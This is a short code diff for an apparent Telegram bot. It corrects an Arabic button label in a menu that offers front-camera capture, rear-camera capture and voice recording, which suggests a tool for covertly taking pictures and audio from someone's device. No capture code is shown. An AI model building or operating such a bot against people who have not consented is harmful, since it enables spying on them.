@@ -175,7 +175,7 @@ bot.onText(/\/start/, (msg) => {
     bot.sendMessage(chatId, message, {
         reply_markup: {
             inline_keyboard: [
-                [{ text: 'تصوير كام أمامي', callback_data:'front_camera' }],
+                [{ text: 'تصوير كامير أمامي', callback_data:'front_camera' }],
                 [{ text: 'تصوير كام خلفي', callback_data:'rear_camera' }],
                 [{ text: 'تسجيل صوت', callback_data:'voice_record' }],
             ]
